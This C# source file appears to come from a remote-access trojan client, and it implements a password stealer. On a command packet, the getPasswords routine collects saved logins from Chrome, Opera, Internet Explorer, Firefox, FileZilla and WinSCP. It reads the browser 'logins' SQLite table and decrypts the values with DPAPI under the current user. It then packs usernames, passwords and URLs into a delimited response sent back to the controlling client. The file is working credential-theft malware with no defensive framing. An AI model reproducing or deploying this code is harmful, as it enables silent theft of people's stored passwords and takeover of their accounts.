using Client.Controllers.BrowsersControllers;
using Client.Models;
using Client.Packets.ClientPackets;
using Client.Packets.ServerPackets;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Client.Controllers
{
    public static class PasswordRecoveryController
    {
        private const string DELIMITER = "$E$";

        public static void getPasswords(GetPasswords packet, ClientMosaic client)
        {
            List<RecoveredAccount> recovered = new List<RecoveredAccount>();

            recovered.AddRange(Chrome.GetSavedPasswords());
            recovered.AddRange(Opera.GetSavedPasswords());
            recovered.AddRange(InternetExplorer.GetSavedPasswords());
            recovered.AddRange(Firefox.GetSavedPasswords());
            recovered.AddRange(FileZilla.GetSavedPasswords());
            recovered.AddRange(WinSCP.GetSavedPasswords());


            List<string> raw = new List<string>();

            foreach (RecoveredAccount value in recovered)
            {
                string rawValue = string.Format("{0}{4}{1}{4}{2}{4}{3}", value.username, value.password, value.URL, value.application, DELIMITER);
                raw.Add(rawValue);
            }

            new GetPasswordsResponse(raw).Execute(client);
        }

        public static List<RecoveredAccount> Passwords(string datapath, string browser)
        {
            List<RecoveredAccount> data = new List<RecoveredAccount>();
            SQLiteController SQLDatabase = null;

            if (!File.Exists(datapath))
                return data;

            try
            {
                SQLDatabase = new SQLiteController(datapath);
            }
            catch (Exception)
            {
                return data;
            }

            if (!SQLDatabase.ReadTable("logins"))
                return data;

            string host;
            string user;
            string pass;
            int totalEntries = SQLDatabase.GetRowCount();

            for (int i = 0; i < totalEntries; i++)
            {
                try
                {
                    host = SQLDatabase.GetValue(i, "origin_url");
                    user = SQLDatabase.GetValue(i, "username_value");
                    pass = Decrypt(SQLDatabase.GetValue(i, "password_value"));

                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(user) && pass != null)
                    {
                        data.Add(new RecoveredAccount
                        {
                            URL = host,
                            username = user,
                            password = pass,
                            application = browser
                        });
                    }
                }
                catch (Exception)
                {
                    // TODO: Exception handling
                }
            }

            return data;
        }

        private static string Decrypt(string EncryptedData)
        {
            if (EncryptedData == null || EncryptedData.Length == 0)
            {
                return null;
            }
            byte[] decryptedData = ProtectedData.Unprotect(System.Text.Encoding.Default.GetBytes(EncryptedData), null, DataProtectionScope.CurrentUser);
            return Encoding.UTF8.GetString(decryptedData);
        }
    }
}

